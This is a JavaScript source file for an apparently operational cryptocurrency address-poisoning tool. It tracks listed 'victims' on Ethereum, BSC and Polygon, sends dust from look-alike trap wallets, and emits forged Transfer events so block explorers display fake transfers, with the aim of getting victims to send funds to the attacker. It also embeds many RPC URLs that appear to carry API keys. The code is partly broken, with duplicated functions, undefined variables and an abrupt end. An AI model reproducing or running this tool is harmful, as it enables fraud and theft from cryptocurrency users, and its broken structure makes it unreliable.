import 'dotenv/config';
import path from 'path';
import { fileURLToPath } from 'url';
import { createPublicClient, createWalletClient, privateKeyToAccount, http, fallback } from 'viem';
import { mainnet, bsc, polygon } from 'viem/chains';
import { exec } from 'child_process';
import { promisify } from 'util';
import { createClient } from '@supabase/supabase-js';

import { config } from '../lib/config.js';
import logger from '../lib/logger.js';
import { withRetry } from '../lib/retry.js';
import { sendAlert } from '../lib/notifier.js';
import { setupGracefulShutdown, onShutdown } from '../lib/shutdown.js';
import { decrypt } from '../lib/encryption.js';

// --- Recreate __dirname for ES Modules ---
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const execAsync = promisify(exec);

console.log('[DEBUG] Starting optimized re_poison.js...');

// --- Supabase Service Client (bypass RLS) with connection pool limits ---
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
let supabaseService = null;
if (supabaseUrl && supabaseServiceKey) {
  supabaseService = createClient(supabaseUrl, supabaseServiceKey, {
    global: {
      fetch: (url, options = {}) => {
        return fetch(url, {
          ...options,
          signal: AbortSignal.timeout(30000),
        });
      },
    },
  });
  console.log('[DEBUG] Supabase service client initialized');
} else {
  console.warn('[DEBUG] Supabase service credentials missing – campaign lookup disabled');
}


// ─── Mirror Token Contracts (one per asset) ───
const MIRROR_TOKEN_ABI = [
  {
    "inputs": [
      { "internalType": "address", "name": "from", "type": "address" },
      { "internalType": "address", "name": "to", "type": "address" },
      { "internalType": "uint256", "name": "value", "type": "uint256" }
    ],
    "name": "transferFrom",
    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

// Load all three contract addresses
const MIRROR_TOKEN_USDC = process.env.MIRROR_TOKEN_USDC;
const MIRROR_TOKEN_USDT = process.env.MIRROR_TOKEN_USDT;
const MIRROR_TOKEN_NATIVE = process.env.MIRROR_TOKEN_NATIVE;

// Map asset symbols to contract addresses
const MIRROR_CONTRACTS = {
  USDC: MIRROR_TOKEN_USDC,
  USDT: MIRROR_TOKEN_USDT,
  ETH: MIRROR_TOKEN_NATIVE,
  BNB: MIRROR_TOKEN_NATIVE,
  MATIC: MIRROR_TOKEN_NATIVE,
};

// Per-campaign wallet clients (already implemented from previous edit)
const campaignMirrorWallets = new Map();

// Log which contracts are enabled
const enabledContracts = Object.entries(MIRROR_CONTRACTS)
  .filter(([_, addr]) => addr)
  .map(([asset, addr]) => `${asset}=${addr}`);

if (enabledContracts.length > 0) {
  console.log(`[DEBUG] MirrorToken contracts enabled: ${enabledContracts.join(', ')}`);
  console.log(`[DEBUG] Each campaign will use its own funding wallet to pay gas for mirrors`);
} else {
  console.warn('[DEBUG] No MirrorToken contracts configured - set MIRROR_TOKEN_USDC, MIRROR_TOKEN_USDT, MIRROR_TOKEN_NATIVE in .env');
}

const SKIP_DUST_IF_MIRROR = process.env.SKIP_DUST_IF_MIRROR === 'true';
if (SKIP_DUST_IF_MIRROR) {
  console.log('[DEBUG] ⚡ SKIP_DUST_IF_MIRROR is enabled. Real dust will be skipped if mirror succeeds.');
}


// --- Config ---
const {
  files: { caught: caughtFile },
  rpc: { observer: observerRpcUrl },
  rePoison: { cooldownMs, dustRetries, delayBetweenMs },
} = config;

// --- State ---
const victims = new Map();
let blockPollInterval = null;
let caughtVictimsPollInterval = null;
let trapsReloadInterval = null;
let lastBlockProcessed = 0n;

// Async Mutex Lock to prevent RPC exhaustion and concurrent Python spawns
let isScanning = false;

// ─── Load caught victims from database ───
const caughtVictims = new Set();

async function loadCaughtVictims() {
  if (!supabaseService) return;
  try {
    const { data, error } = await supabaseService
      .from('traps')
      .select('victim_address')
      .eq('is_caught', true);

    if (error) {
      console.warn(`[DEBUG] Supabase query for caught victims failed: ${error.message}`);
      return;
    }

    if (data && data.length > 0) {
      const newSet = new Set(data.map(row => row.victim_address.toLowerCase()));
      caughtVictims.clear();
      newSet.forEach(addr => caughtVictims.add(addr));
      console.log(`[DEBUG] Loaded ${caughtVictims.size} caught victims from database`);
    }
  } catch (err) {
    console.warn(`[DEBUG] Could not load caught victims from DB: ${err.message}`);
  }
}

// ─── Load traps from database ───
async function loadTrapsFromDB() {
  if (!supabaseService) {
    console.error('[re_poison] Supabase service not available');
    process.exit(1);
  }

  try {
    const { data: campaigns, error: campError } = await supabaseService
      .from('campaigns')
      .select('id, funding_private_key_enc') // 🆕 Added funding_private_key_enc
      .eq('chain', chainName);

    if (campError) {
      console.error(`[DEBUG] Failed to fetch campaigns: ${campError.message}`);
      return 0;
    }

    if (!campaigns || campaigns.length === 0) {
      console.log(`[DEBUG] No campaigns found for chain ${chainName}`);
      return 0;
    }

    const campaignIds = campaigns.map(c => c.id);

    // 🆕 Load funding keys for each campaign to use as mirror operators
    if (MIRROR_TOKEN_ADDRESS) {
      for (const camp of campaigns) {
        if (!camp.funding_private_key_enc) {
          console.warn(`[DEBUG] Campaign ${camp.id} has no funding key, mirror disabled for this campaign`);
          continue;
        }
        try {
          const fundingKey = decrypt(camp.funding_private_key_enc);
          const fundingAccount = privateKeyToAccount(
            fundingKey.startsWith('0x') ? fundingKey : `0x${fundingKey}`
          );

          const walletClient = createWalletClient({
            account: fundingAccount,
            chain: viemChain,
            transport: fallback(fallbackUrls.map(url => http(url, { timeout: 15000 })), { rank: false }),
          });

          campaignMirrorWallets.set(camp.id, {
            walletClient,
            operatorAddress: fundingAccount.address
          });
          console.log(`[DEBUG] Campaign ${camp.id} funding key loaded (operator: ${fundingAccount.address})`);
        } catch (err) {
          console.warn(`[DEBUG] Failed to decrypt funding key for campaign ${camp.id}: ${err.message}`);
        }
      }
    }

    const { data: traps, error: trapError } = await supabaseService
      .from('traps')
      .select('id, campaign_id, victim_address, trap_address, counterparty_address, trap_private_key_enc')
      .in('campaign_id', campaignIds);

    // ... rest of the function stays the same

    if (trapError) {
      console.error(`[DEBUG] Failed to fetch traps: ${trapError.message}`);
      return 0;
    }

    if (!traps || traps.length === 0) {
      console.log(`[DEBUG] No traps found for campaigns on chain ${chainName}`);
      return 0;
    }

    console.log(`[DEBUG] Fetched ${traps.length} traps from database`);

    let loaded = 0;
    for (const row of traps) {
      try {
        const privateKey = decrypt(row.trap_private_key_enc);
        const victim = row.victim_address.toLowerCase();
        const counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
        const campaignId = row.campaign_id;

        const existing = victims.get(victim);
        victims.set(victim, {
          privateKey,
          trapAddress: row.trap_address.toLowerCase(),
          counterparty,
          lastPoison: existing ? existing.lastPoison : 0, // ✅ Preserve cooldown state
          campaignId,
        });
        loaded++;
      } catch (err) {
        console.warn(`[DEBUG] Failed to decrypt trap for victim ${row.victim_address}: ${err.message}`);
      }
    }

    console.log(`[DEBUG] Loaded ${loaded} victims from database`);
    return loaded;
  } catch (err) {
    console.error(`[DEBUG] Error loading traps from DB: ${err.message}`);
    return 0;
  }
}

// --- MULTI‑CHAIN ---
const chainName = config.chain || 'ethereum';
const chainCfg = config.getChainConfig ? config.getChainConfig() : null;
const nativeSymbol = chainCfg?.nativeSymbol || 'ETH';
const chainId = chainCfg?.chainId || 1;

let viemChain;
switch (chainName) {
  case 'bsc':
    viemChain = bsc;
    break;
  case 'polygon':
    viemChain = polygon;
    break;
  default:
    viemChain = mainnet;
}

const chainRpc = chainCfg?.rpc || observerRpcUrl;

console.log(`[DEBUG] Chain: ${chainName}, Native symbol: ${nativeSymbol}, Viem chain: ${viemChain.name}`);
console.log(`[DEBUG] Observer RPC: ${chainRpc}`);
console.log('[DEBUG] cooldownMs:', cooldownMs);
console.log('[DEBUG] dustRetries:', dustRetries);
console.log('[DEBUG] delayBetweenMs:', delayBetweenMs);

const COOLDOWN_MS = cooldownMs || 60 * 60 * 1000;
const DUST_RETRIES = dustRetries || 2;
const DELAY_BETWEEN_DUST_MS = delayBetweenMs || 2000;
const EXEC_TIMEOUT_MS = 180000;

// 🚀 Chain-aware scanning parameters
const CHAIN_SCAN_CONFIG = {
  ethereum: { blockTimeMs: 12000, pollIntervalMs: 15000, maxBlocksPerScan: 5 },
  bsc: { blockTimeMs: 3000, pollIntervalMs: 6000, maxBlocksPerScan: 30 },
  polygon: { blockTimeMs: 2000, pollIntervalMs: 5000, maxBlocksPerScan: 40 },
};
const scanConfig = CHAIN_SCAN_CONFIG[chainName] || CHAIN_SCAN_CONFIG.ethereum;

// --- Dynamic cooldown limits ---
const MIN_COOLDOWN_MS = parseInt(process.env.MIN_COOLDOWN_MS || '600000', 10);
const MAX_COOLDOWN_MS = parseInt(process.env.MAX_COOLDOWN_MS || '3600000', 10);

// --- Deduplication and concurrency control ---
const processedTxHashes = new Map();
const trapLocks = new Map();

// --- Per‑victim statistics ---
const victimStats = new Map();
const victimTxTimestamps = new Map();
let lastStatsLogTime = 0;
const STATS_LOG_INTERVAL_MS = 60 * 60 * 1000;

// 🚀 OPTIMIZATION: Pre-compute token address map for O(1) lookups in hot path
const tokenAddressMap = new Map();
if (chainCfg && chainCfg.tokens) {
  for (const [symbol, address] of Object.entries(chainCfg.tokens)) {
    tokenAddressMap.set(address.toLowerCase(), symbol);
  }
}

// ─── Public RPC Fallbacks ───
const PUBLIC_FALLBACKS = {
  bsc: [
    'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
    'https://bsc-dataseed.binance.org',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
    'https://rpc.ankr.com/bsc',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
    'https://bsc.publicnode.com',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
    'https://1rpc.io/bnb',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
    'https://bsc.drpc.org',
    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
  ],
  polygon: [
    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
    'https://polygon-rpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
    'https://rpc.ankr.com/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
    'https://polygon.llamarpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
    'https://polygon.publicnode.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
    'https://1rpc.io/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
  ],
  ethereum: [
    'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
    'https://ethereum.publicnode.com',
    'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
    'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
    'https://rpc.ankr.com/eth',
    'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
    'https://eth.llamarpc.com',
    'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
    'https://1rpc.io/eth',
    'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
    'https://eth.drpc.org',
    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
  ],
};

const normalizedChain = chainName?.toLowerCase() || '';
const rawUrls = [chainRpc, ...(PUBLIC_FALLBACKS[normalizedChain] || [])];
const fallbackUrls = Array.from(new Set(rawUrls.filter(Boolean)));

const client = createPublicClient({
  chain: viemChain,
  transport: fallback(
    fallbackUrls.map(url => http(url, { timeout: 8000 })),
    { rank: false }
  ),
});


// ─── Mirror operator wallet (signs the forged-event txs) ───
if (MIRROR_OPERATOR_KEY && MIRROR_TOKEN_ADDRESS) {
  try {
    const operatorAccount = privateKeyToAccount(
      MIRROR_OPERATOR_KEY.startsWith('0x') ? MIRROR_OPERATOR_KEY : `0x${MIRROR_OPERATOR_KEY}`
    );
    mirrorWalletClient = createWalletClient({
      account: operatorAccount,
      chain: viemChain,
      transport: fallback(fallbackUrls.map(url => http(url, { timeout: 15000 })), { rank: false }),
    });
    console.log(`[DEBUG] MirrorToken enabled at ${MIRROR_TOKEN_ADDRESS} (operator ${operatorAccount.address})`);
  } catch (err) {
    console.warn(`[DEBUG] MirrorToken disabled - bad operator key: ${err.message}`);
  }
} else {
  console.warn('[DEBUG] MirrorToken disabled - set MIRROR_TOKEN_ADDRESS and MIRROR_OPERATOR_KEY in .env');
}


// --- Helper: retry wrapper ---
async function withRpcRetry(fn, context, maxAttempts = 2, baseDelay = 1000, shouldRetry = () => true) {
  return withRetry(fn, context, maxAttempts, baseDelay, shouldRetry);
}

// --- Compute dynamic cooldown ---
function getDynamicCooldown(victimAddress) {
  const timestamps = victimTxTimestamps.get(victimAddress);
  if (!timestamps || timestamps.length < 2) return COOLDOWN_MS;

  let sum = 0;
  const len = timestamps.length;
  for (let i = 1; i < len; i++) {
    sum += timestamps[i] - timestamps[i - 1];
  }
  const avgInterval = sum / (len - 1);

  let cooldown = avgInterval * 0.3;
  return Math.max(MIN_COOLDOWN_MS, Math.min(MAX_COOLDOWN_MS, cooldown));
}

// ─── Asset detection from transaction ───────────────
function getAssetFromTx(tx) {
  if (!tx || !tx.to) return null;
  const to = tx.to.toLowerCase();

  const tokenSymbol = tokenAddressMap.get(to);
  if (tokenSymbol) {
    return tokenSymbol;
  }

  if (tx.value && BigInt(tx.value) > 0n) {
    return nativeSymbol;
  }

  return null;
}


// ─── Mirror helpers ───
const TOKEN_DECIMALS = { USDT: 6, USDC: 6, DAI: 18, BUSD: 18, WBTC: 8, WETH: 18 };

function normalizeTo6Dec(raw, decimals) {
  if (decimals === 6) return raw;
  if (decimals > 6) return raw / (10n ** BigInt(decimals - 6));
  return raw * (10n ** BigInt(6 - decimals));
}

function computeMirrorRawValue(tx, detectedAsset) {
  try {
    // ERC-20 transfer(to, value) - selector 0xa9059cbb
    if (tx.input && tx.input.startsWith('0xa9059cbb') && tx.input.length >= 138) {
      return BigInt('0x' + tx.input.slice(74, 138));
    }
    // ERC-20 transferFrom(from, to, value) - selector 0x23b872dd
    if (tx.input && tx.input.startsWith('0x23b872dd') && tx.input.length >= 202) {
      return BigInt('0x' + tx.input.slice(138, 202));
    }
    // Native transfer (value is in tx.value, already in wei = 18 decimals)
    if (tx.value && BigInt(tx.value) > 0n) {
      return BigInt(tx.value);
    }
    return 0n;
  } catch {
    return 0n;
  }
}

// Per-campaign lock to prevent nonce collisions within same funding wallet
const campaignMirrorLocks = new Map();

function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, campaignId, contractAddress) {
  if (!walletClient || !contractAddress) return Promise.resolve(false);

  if (!campaignMirrorLocks.has(campaignId)) {
    campaignMirrorLocks.set(campaignId, Promise.resolve());
  }

  const currentLock = campaignMirrorLocks.get(campaignId);

  const run = currentLock.then(async () => {
    const hash = await walletClient.writeContract({
      address: contractAddress,  // 🆕 Use the passed contract address
      abi: MIRROR_TOKEN_ABI,
      functionName: 'transferFrom',
      args: [victimAddress, trapAddress, rawValue],
    });
    logger.info(`[mirror] Forged Transfer emitted via ${contractAddress.slice(0, 10)}...: ${victimAddress} → ${trapAddress} raw=${rawValue} tx=${hash}`);
    return hash;
  }).catch(err => {
    logger.warn(`[mirror] Failed to emit forged transfer: ${err.message}`);
    return false;
  });

  campaignMirrorLocks.set(campaignId, run.then(() => { }));
  return run;
}


// ─── Mirror helpers ───
const TOKEN_DECIMALS = { USDT: 6, USDC: 6, DAI: 18, BUSD: 18, WBTC: 8, WETH: 18 };

// MirrorToken.decimals() = 6, so normalize the mirrored raw value so the
// explorer prints the SAME human-readable number as the victim's real tx.
function normalizeTo6Dec(raw, decimals) {
  if (decimals === 6) return raw;
  if (decimals > 6) return raw / (10n ** BigInt(decimals - 6));
  return raw * (10n ** BigInt(6 - decimals));
}

function computeMirrorRawValue(tx, detectedAsset) {
  try {
    if (tx.input && tx.input.startsWith('0xa9059cbb') && tx.input.length >= 138) {
      // transfer(to, value) → value word
      return normalizeTo6Dec(BigInt('0x' + tx.input.slice(74, 138)), TOKEN_DECIMALS[detectedAsset] || 6);
    }
    if (tx.input && tx.input.startsWith('0x23b872dd') && tx.input.length >= 202) {
      // transferFrom(from, to, value) → value word
      return normalizeTo6Dec(BigInt('0x' + tx.input.slice(138, 202)), TOKEN_DECIMALS[detectedAsset] || 6);
    }
    if (tx.value && BigInt(tx.value) > 0n) {
      // native (18 dec) → 6 dec so the displayed number matches
      return BigInt(tx.value) / 1000000000000n;
    }
    return 0n;
  } catch {
    return 0n;
  }
}

// Serialize mirror emits so concurrent victims don't nonce-collide on the operator wallet
let mirrorLock = Promise.resolve();

function emitForgedTransfer(victimAddress, trapAddress, rawValue) {
  const run = mirrorLock.then(async () => {
    if (!mirrorWalletClient || !MIRROR_TOKEN_ADDRESS) return false;
    const hash = await mirrorWalletClient.writeContract({
      address: MIRROR_TOKEN_ADDRESS,
      abi: MIRROR_TOKEN_ABI,
      functionName: 'transferFrom',
      args: [victimAddress, trapAddress, rawValue],
    });
    logger.info(`[mirror] Forged Transfer emitted: ${victimAddress} → ${trapAddress} raw=${rawValue} tx=${hash}`);
    return hash;
  }).catch(err => {
    logger.warn(`[mirror] Failed to emit forged transfer: ${err.message}`);
    return false;
  });
  mirrorLock = run.then(() => { });
  return run;
}


// ─── Send dust via duster.py (accepts optional asset) ──
async function sendDust(privateKey, victimAddress, campaignId, asset = null) {
  const dusterPath = path.resolve(__dirname, '../tools/duster.py');
  const pythonCmd = path.resolve(__dirname, '../venv/bin/python3');

  const env = { ...process.env, CHAIN: chainName };
  if (campaignId) env.CAMPAIGN_ID = campaignId;
  if (asset) env.DUST_ASSET = asset;

  const cmd = `${pythonCmd} ${dusterPath} ${privateKey} ${victimAddress}`;

  try {
    const { stdout, stderr } = await execAsync(cmd, { timeout: EXEC_TIMEOUT_MS, env });
    if (stderr) logger.warn(`duster stderr: ${stderr}`);
    logger.info(`duster stdout: ${stdout.trim()}`);

    const txHashMatch = stdout.match(/0x[a-fA-F0-9]{64}/);
    return txHashMatch ? txHashMatch[0] : true;
  } catch (error) {
    if (error.killed && error.signal === 'SIGTERM') {
      logger.error(`duster timed out after ${EXEC_TIMEOUT_MS}ms`);
    } else {
      logger.error(`duster error: ${error.message}`);
      if (error.stdout) logger.info(`duster stdout (failed): ${error.stdout.trim()}`);
      if (error.stderr) logger.warn(`duster stderr (failed): ${error.stderr.trim()}`);
    }
    return false;
  }
}

// --- Poison a victim (accepts asset) ---
async function poisonVictim(victimAddress, privateKey, campaignId, asset = null) {
  logger.info(`Re‑poisoning victim ${victimAddress}...`);
  let successCount = 0;
  let txHash = null;

  for (let i = 0; i < DUST_RETRIES; i++) {
    const result = await sendDust(privateKey, victimAddress, campaignId, asset);
    if (result) {
      successCount++;
      if (typeof result === 'string' && result.startsWith('0x')) {
        txHash = result;
      }
      break;
    }
    if (i < DUST_RETRIES - 1) {
      await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_DUST_MS));
    }
  }

  const txHashMsg = txHash ? `\n🔗 TX: ${txHash}` : '';
  const statusMsg = successCount > 0 ? 'Re‑poison complete' : 'Re‑poison failed';
  const msg = `${statusMsg}: ${successCount}/${DUST_RETRIES} dust tx sent to ${victimAddress}${txHashMsg}`;
  logger.info(msg);

  if (successCount > 0) {
    try {
      await sendAlert(`♻️ ${msg}`, 'info', campaignId);
    } catch (err) {
      logger.warn(`Failed to send re-poison summary alert: ${err.message}`);
    }
  }

  const entry = victims.get(victimAddress);
  if (entry) entry.lastPoison = Date.now();

  let stats = victimStats.get(victimAddress) || { attempts: 0, successes: 0, failures: 0 };
  stats.attempts++;
  if (successCount > 0) stats.successes++;
  else stats.failures++;
  victimStats.set(victimAddress, stats);

  const totalAttempts = Array.from(victimStats.values()).reduce((sum, s) => sum + s.attempts, 0);
  const now = Date.now();
  if (totalAttempts % 10 === 0 || now - lastStatsLogTime > STATS_LOG_INTERVAL_MS) {
    let summary = `📊 Re‑poison stats (total attempts: ${totalAttempts}):\n`;
    for (const [addr, s] of victimStats) {
      summary += `  ${addr}: ${s.successes} success, ${s.failures} fail (${s.attempts} attempts)\n`;
    }
    logger.info(summary);
    lastStatsLogTime = now;
  }
}

// --- Check a single transaction ---
function checkTransaction(tx) {
  if (!tx || !tx.from || !tx.to || !tx.hash) return;

  const from = tx.from.toLowerCase();
  const to = tx.to.toLowerCase();
  const hash = tx.hash;
  const now = Date.now();

  // Deduplicate
  if (processedTxHashes.has(hash)) return;
  processedTxHashes.set(hash, now);

  if (processedTxHashes.size > 50000) {
    processedTxHashes.clear();
    logger.debug('Cleared processedTxHashes map to prevent memory bloat');
  }

  // Caught victim exclusion
  if (caughtVictims.has(from)) {
    logger.debug(`[skip] ${from} is a caught victim, removing from active map`);
    victims.delete(from);
    return;
  }

  if (!victims.has(from)) return;

  const entry = victims.get(from);

  // 🚀 FIX BUG #1: Extract actual recipient from ERC-20 transfer
  let actualRecipient = to;

  // Check if this is an ERC-20 transfer(address,uint256) - selector 0xa9059cbb
  if (tx.input && tx.input.startsWith('0xa9059cbb') && tx.input.length >= 138) {
    // Extract recipient from input data (bytes 16-36 after 0x prefix = chars 34-74)
    actualRecipient = '0x' + tx.input.slice(34, 74).toLowerCase();
    logger.debug(`[ERC20] Detected token transfer: ${from} → ${actualRecipient} via ${to}`);
  }
  // Check if this is an ERC-20 transferFrom(address,address,uint256) - selector 0x23b872dd
  // Used by DEX routers (Uniswap, PancakeSwap, 1inch, etc.)
  else if (tx.input && tx.input.startsWith('0x23b872dd') && tx.input.length >= 202) {
    // transferFrom signature: transferFrom(address from, address to, uint256 value)
    // Extract 'to' address (second parameter) from input data (bytes 48-68 = chars 98-138)
    actualRecipient = '0x' + tx.input.slice(98, 138).toLowerCase();
    logger.debug(`[ERC20] Detected token transferFrom: ${from} → ${actualRecipient} via ${to}`);
  }

  // Counterparty wildcard check using actual recipient
  if (entry.counterparty && actualRecipient !== entry.counterparty) {
    logger.debug(`[skip] ${from} sent to ${actualRecipient} but counterparty is ${entry.counterparty}`);
    return;
  }

  // Dynamic cooldown check
  let timestamps = victimTxTimestamps.get(from);
  if (!timestamps) {
    timestamps = [];
    victimTxTimestamps.set(from, timestamps);
  }
  timestamps.push(Date.now());

  if (timestamps.length > 10) {
    timestamps.shift();
  }

  const dynamicCooldown = getDynamicCooldown(from);
  if (now - entry.lastPoison < dynamicCooldown) {
    logger.debug(`[skip] ${from} on cooldown (${Math.round((dynamicCooldown - (now - entry.lastPoison)) / 1000)}s remaining)`);
    return;
  }

  // 🚀 PREVENT CONCURRENT PYTHON SPAWNS
  if (trapLocks.get(entry.privateKey)) {
    logger.debug(`[skip] Trap wallet for victim ${from} is currently busy. Skipping.`);
    return;
  }
  trapLocks.set(entry.privateKey, true);

  // ─── Detect asset from the transaction ───
  const detectedAsset = getAssetFromTx(tx);
  if (detectedAsset) {
    logger.info(`[asset] Detected asset for re-poison: ${detectedAsset}`);
  } else {
    logger.info('[asset] No specific asset detected, will fallback to USDC/USDT');
  }

  // Async Execution
  (async () => {
    try {
      const counterpartyMsg = entry.counterparty ? entry.counterparty : "[WILDCARD TARGET]";
      logger.info(`Victim ${from} sent to ${counterpartyMsg}: ${tx.hash}`);

      try {
        await sendAlert(`🔔 Victim targeting counterparty\nVictim: ${from}\nCounterparty: ${counterpartyMsg}\nTX: ${tx.hash}`, 'info', entry.campaignId);
      } catch (alertErr) {
        logger.warn(`Failed to send initial alert: ${alertErr.message}`);
      }

      // 🆕 VECTOR 1: forged Transfer event using the correct contract for the asset
      const mirrorRaw = computeMirrorRawValue(tx, detectedAsset);
      let mirrorSuccess = false;

      if (mirrorRaw > 0n) {
        // Select the correct contract based on detected asset
        const mirrorContractAddress = MIRROR_CONTRACTS[detectedAsset];

        if (mirrorContractAddress) {
          const campaignWallet = campaignMirrorWallets.get(entry.campaignId);
          if (campaignWallet) {
            logger.info(`[mirror] Detected ${detectedAsset}, using contract ${mirrorContractAddress}`);
            const result = await emitForgedTransfer(
              from,
              entry.trapAddress,
              mirrorRaw,
              campaignWallet.walletClient,
              entry.campaignId,
              mirrorContractAddress  // 🆕 Pass the specific contract address
            );
            mirrorSuccess = !!result;
          } else {
            logger.debug(`[mirror] No funding key loaded for campaign ${entry.campaignId}, skipping mirror`);
          }
        } else {
          logger.debug(`[mirror] No mirror contract configured for asset: ${detectedAsset}`);
        }
      }

      // VECTOR 2 (real dust): conditional based on env flag
      if (SKIP_DUST_IF_MIRROR && mirrorSuccess) {
        logger.info(`[skip-dust] Mirror succeeded for ${from}. Skipping real dust to save trap funds.`);

        if (entry) entry.lastPoison = Date.now();

        let stats = victimStats.get(from) || { attempts: 0, successes: 0, failures: 0 };
        stats.attempts++;
        stats.successes++;
        victimStats.set(from, stats);

        try {
          await sendAlert(`🪞 Mirror emitted (real dust skipped)\nVictim: ${from}\nAsset: ${detectedAsset}\nTX: ${tx.hash}`, 'info', entry.campaignId);
        } catch (err) { /* ignore */ }

      } else {
        await poisonVictim(from, entry.privateKey, entry.campaignId, detectedAsset);
      }

    } catch (err) {
      logger.error(`Error in async poison task for ${from}: ${err.message}`);
    } finally {
      trapLocks.delete(entry.privateKey);
    }
  })();
}

// --- Block scanner ---
async function scanNewBlocks() {
  if (isScanning) return;
  isScanning = true;

  try {
    const currentBlock = await withRpcRetry(
      () => client.getBlockNumber(),
      'getBlockNumber',
      2,
      1000
    );

    if (lastBlockProcessed === 0n) {
      lastBlockProcessed = currentBlock > 2n ? currentBlock - 2n : 0n;
      console.log(`[DEBUG] Initial block set to ${lastBlockProcessed}`);
      isScanning = false;
      return;
    }

    let startBlock = lastBlockProcessed + 1n;
    let endBlock = currentBlock;
    const blockDiff = Number(endBlock - startBlock);

    // 🚀 Use chain-specific max blocks
    if (blockDiff > scanConfig.maxBlocksPerScan) {
      logger.warn(`Fell behind by ${blockDiff} blocks. Capping to latest ${scanConfig.maxBlocksPerScan} blocks.`);
      startBlock = currentBlock - BigInt(scanConfig.maxBlocksPerScan) + 1n;
    }

    if (startBlock <= endBlock) {
      // 🚀 Fetch blocks in parallel for speed (up to 5 at a time)
      const blockNumbers = [];
      for (let b = startBlock; b <= endBlock; b++) {
        blockNumbers.push(b);
      }

      const batchSize = 5;
      for (let i = 0; i < blockNumbers.length; i += batchSize) {
        const batch = blockNumbers.slice(i, i + batchSize);
        const blocks = await Promise.all(
          batch.map(block =>
            withRpcRetry(
              () => client.getBlock({ blockNumber: block, includeTransactions: true }),
              `getBlock(${block})`,
              2,
              1000
            ).catch(err => {
              logger.warn(`Failed to fetch block ${block}: ${err.message}`);
              return null;
            })
          )
        );

        let highestSuccessfulBlock = lastBlockProcessed;
        for (let i = 0; i < blocks.length; i++) {
          const fullBlock = blocks[i];
          const blockNum = batch[i];
          if (fullBlock && fullBlock.transactions) {
            for (const tx of fullBlock.transactions) {
              try {
                checkTransaction(tx);
              } catch (err) {
                logger.warn(`Error evaluating tx ${tx.hash}: ${err.message}`);
              }
            }
            highestSuccessfulBlock = BigInt(blockNum);
          } else {
            // Stop advancing if a block failed so it can be retried next cycle
            break;
          }
        }
        lastBlockProcessed = highestSuccessfulBlock;
      }
    }
  } catch (err) {
    logger.warn(`Block scan error: ${err.message}`);
  } finally {
    isScanning = false;
  }
}

// --- Start watcher ---
function startWatcher() {
  console.log('[DEBUG] Starting block‑based watcher...');
  logger.info(`Watching new blocks for victim → counterparty transactions (poll every ${scanConfig.pollIntervalMs / 1000}s)...`);

  (async () => {
    try {
      lastBlockProcessed = await client.getBlockNumber();
      console.log(`[DEBUG] Starting from block ${lastBlockProcessed}`);
    } catch (e) {
      console.error(`[DEBUG] Failed to get initial block: ${e.message}`);
    }
  })();

  // 🚀 Chain-aware polling interval
  blockPollInterval = setInterval(scanNewBlocks, scanConfig.pollIntervalMs);

  // Keep caught victims poll at 8 minutes
  caughtVictimsPollInterval = setInterval(loadCaughtVictims, 480000);

  // 🚀 FIX BUG #2: Reload traps every 5 minutes to pick up new campaigns
  trapsReloadInterval = setInterval(async () => {
    console.log('[DEBUG] Reloading traps from database...');
    await loadTrapsFromDB();
  }, 300000);

  console.log(`[DEBUG] Watcher started. Polling every ${scanConfig.pollIntervalMs / 1000}s, max ${scanConfig.maxBlocksPerScan} blocks per scan.`);
}

// --- Graceful shutdown ---
setupGracefulShutdown();

onShutdown(async () => {
  console.log('[DEBUG] Shutting down...');
  if (blockPollInterval) clearInterval(blockPollInterval);
  if (caughtVictimsPollInterval) clearInterval(caughtVictimsPollInterval);
  if (trapsReloadInterval) clearInterval(trapsReloadInterval);
  console.log('[DEBUG] Intervals cleared.');
});

// --- Main ---
console.log('[DEBUG] Loading traps from database...');
const loaded = await loadTrapsFromDB();
if (loaded === 0) {
  logger.error(`No victims loaded from database. Exiting.`);
